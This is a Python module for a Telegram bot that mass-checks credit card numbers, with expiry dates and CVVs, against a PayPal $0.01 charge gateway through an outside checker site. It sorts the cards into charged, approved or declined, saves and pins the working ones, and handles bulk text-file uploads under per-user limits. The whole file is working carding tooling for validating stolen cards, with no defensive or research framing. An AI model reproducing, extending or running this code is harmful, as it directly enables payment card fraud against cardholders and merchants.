# py_commands.py

from telethon import events, Button
import asyncio
import httpx
import time
import os
import re
import json

# --- Globals ---
client = None
utils = {}
ACTIVE_MPYTXT_PROCESSES = {}

# --- Core API Function ---
async def check_py_api(card):
    """Makes a request to the PayPal Direct $0.01 gateway."""
    try:
        api_url = f"https://ravenxchecker.site/check/ppa.php?lista={card}"

        async with httpx.AsyncClient(timeout=60.0) as session:
            response = await session.get(api_url)
            data = response.json()

            api_status = data.get("status")
            message = data.get("response_message", "No message from API.")
            response_code = data.get("response_code")

            # --- FIXED ---
            # Now differentiates between Charged and Approved based on response_code
            if api_status == "LIVE":
                # A true charge has a success code. The PHP logic implies codes like "SUCCESS".
                if response_code == 'SUCCESS':
                    return {"status": "Charged", "message": message}
                else:
                    # Other LIVE codes (ACCOUNT_RESTRICTED, CCN_LIVE, etc.) are "Approved".
                    return {"status": "Approved", "message": message}
            else:
                # Any other status like "DEAD" is a decline.
                return {"status": "Declined", "message": message}

    except json.JSONDecodeError:
        return {"status": "Error", "message": f"Invalid API Response: {response.text[:100]}"}
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {"status": "Error", "message": str(e)}

# --- Single Check (/py) ---
async def process_py_card(event):
    card = utils['extract_card'](event.raw_text) or (await utils['extract_card']( (await event.get_reply_message()).text ) if event.is_reply and await event.get_reply_message() else None)
    if not card: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /𝙥𝙮 4111...|12|25|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤")

    loading_msg = await event.reply("🍳")
    start_time = time.time()
    res = await check_py_api(card)
    elapsed_time = round(time.time() - start_time, 2)
    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    
    status = res.get("status")
    message = res.get("message")

    # --- FIXED ---
    # Added separate handling for "Approved" status
    if status == "Charged":
        status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
        await utils['save_approved_card'](card, "CHARGED (PY)", message, "PayPal Direct Gateway", "0.01$")
    elif status == "Approved":
        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        await utils['save_approved_card'](card, "APPROVED (PY)", message, "PayPal Direct Gateway", "N/A")
    else: # Handles "Declined" and "Error"
        status_header = f"~~ {status.upper()} ~~ ❌"

    msg = f"{status_header}\n\n𝗖𝗖 ⇾ `{card}`\n𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ PayPal Direct $0.01\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}\n\n```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```\n\n𝗧𝗼𝗼𝗸 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    
    await loading_msg.delete()
    result_msg = await event.reply(msg)
    if status == "Charged": await utils['pin_charged_message'](event, result_msg)

# --- Mass Check (/mpy) ---
async def process_mpy_cards(event, cards):
    sent_msg = await event.reply(f"```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
    for card in cards:
        res = await check_py_api(card)
        status = res.get("status")
        message = res.get("message")

        if status in ["Charged", "Approved"]:
            brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎" if status == "Charged" else "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            amount = "0.01$" if status == "Charged" else "N/A"
            await utils['save_approved_card'](card, f"{status.upper()} (PY)", message, "PayPal Direct Gateway", amount)
            
            card_msg = f"{status_header}\n\n𝗖𝗖 ⇾ `{card}`\n𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ PayPal Direct $0.01\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}\n\n```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"
            result_msg = await event.reply(card_msg)
            if status == "Charged": await utils['pin_charged_message'](event, result_msg)
        await asyncio.sleep(1)
    await sent_msg.edit(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")

# --- Mass Text File Check (/mpytxt) ---
async def process_mpytxt_cards(event, cards):
    user_id, total = event.sender_id, len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply("```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    
    try:
        for i in range(0, len(cards), 5):
            if user_id not in ACTIVE_MPYTXT_PROCESSES: break
            batch = cards[i:i+5]
            tasks = [check_py_api(card) for card in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for card, res in zip(batch, results):
                if user_id not in ACTIVE_MPYTXT_PROCESSES: break
                checked += 1
                if isinstance(res, Exception): res = {"status": "Error", "message": str(res)}
                
                status = res.get("status")
                message = res.get("message")
                status_header = ""

                if status == "Charged":
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                elif status == "Approved":
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                else:
                    declined += 1

                if status_header:
                    amount = "0.01$" if status == "Charged" else "N/A"
                    await utils['save_approved_card'](card, f"{status.upper()} (PY)", message, "PayPal Direct Gateway", amount)
                    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
                    card_msg = f"{status_header}\n\n𝗖𝗖 ⇾ `{card}`\n𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ PayPal Direct $0.01\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}\n\n```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"
                    result_msg = await event.reply(card_msg)
                    if status == "Charged": await utils['pin_charged_message'](event, result_msg)

                buttons = [[Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")],[Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {message[:25]}...", b"none")],[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],[Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] ✅", b"none")],[Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],[Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] 🔥", b"none")],[Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_py_mptxt:{user_id}".encode())]]
                try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except: pass
            await asyncio.sleep(1)

        final_caption = f"✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!\n\n𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 💎 : {charged}\n𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅ : {approved}\n𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌ : {declined}\n𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 🔥 : {total}"
        await status_msg.edit(final_caption, buttons=None)
    finally:
        ACTIVE_MPYTXT_PROCESSES.pop(user_id, None)

# --- Event Handler Registration (No changes below this line) ---
async def py_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    asyncio.create_task(process_py_card(event))

async def mpy_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    replied_msg = await event.get_reply_message() if event.is_reply else None
    cards = utils['extract_all_cards'](replied_msg.text if replied_msg and replied_msg.text else event.raw_text)
    if not cards: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙥𝙮 5414...|01|25|123 5414...|02|26|321")
    if len(cards) > 20: cards = cards[:20]; await event.reply(f"⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 20 𝙘𝙖𝙧𝙙𝙨. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 20.")
    asyncio.create_task(process_mpy_cards(event, cards))

async def mpytxt_command(event):
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        message, buttons = (utils['banned_user_message'](), None) if access_type == "banned" else utils['access_denied_message_with_button']()
        return await event.reply(message, buttons=buttons)
    user_id = event.sender_id
    if user_id in ACTIVE_MPYTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    replied_msg = await event.get_reply_message()
    if not event.is_reply or not replied_msg or not replied_msg.document: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙥𝙮𝙩𝙭𝙩```")
    
    file_path = None
    try:
        file_path = await replied_msg.download_media(); lines = open(file_path, "r", encoding='utf-8', errors='ignore').read().splitlines()
    except Exception as e: return await event.reply(f"Error reading file: {e}")
    finally:
        if file_path and os.path.exists(file_path): os.remove(file_path)

    cards = [line.strip() for line in lines if re.match(r'\d{12,16}[|\s/]*\d{1,2}[|\s/]*\d{2,4}[|\s/]*\d{3,4}', line.strip())]
    if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
    
    cc_limit = utils['get_cc_limit'](access_type, user_id)
    if len(cards) > cc_limit: cards = cards[:cc_limit]; await event.reply(f"⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩).")
    
    ACTIVE_MPYTXT_PROCESSES[user_id] = True
    asyncio.create_task(process_mpytxt_cards(event, cards))

async def stop_mpytxt_callback(event):
    try:
        process_user_id = int(event.pattern_match.group(1).decode()); clicking_user_id = event.sender_id
        if not ((clicking_user_id == process_user_id) or (clicking_user_id in utils['ADMIN_ID'])):
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!", alert=True)
        if process_user_id in ACTIVE_MPYTXT_PROCESSES:
            ACTIVE_MPYTXT_PROCESSES.pop(process_user_id); await event.answer("⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!", alert=True)
            try: await event.edit(buttons=None)
            except: pass
        else: await event.answer("❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!", alert=True)
    except Exception as e: await event.answer(f"Error: {e}", alert=True)

def register_handlers(_client, _utils):
    global client, utils; client, utils = _client, _utils
    client.on(events.NewMessage(pattern=r'(?i)^[/.]py'))(py_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mpy'))(mpy_command)
    client.on(events.NewMessage(pattern=r'(?i)^[/.]mpytxt$'))(mpytxt_command)
    client.on(events.CallbackQuery(pattern=rb"stop_py_mptxt:(\d+)"))(stop_mpytxt_callback)
    print("✅ Successfully registered PY, MPY, MPYTXT commands.")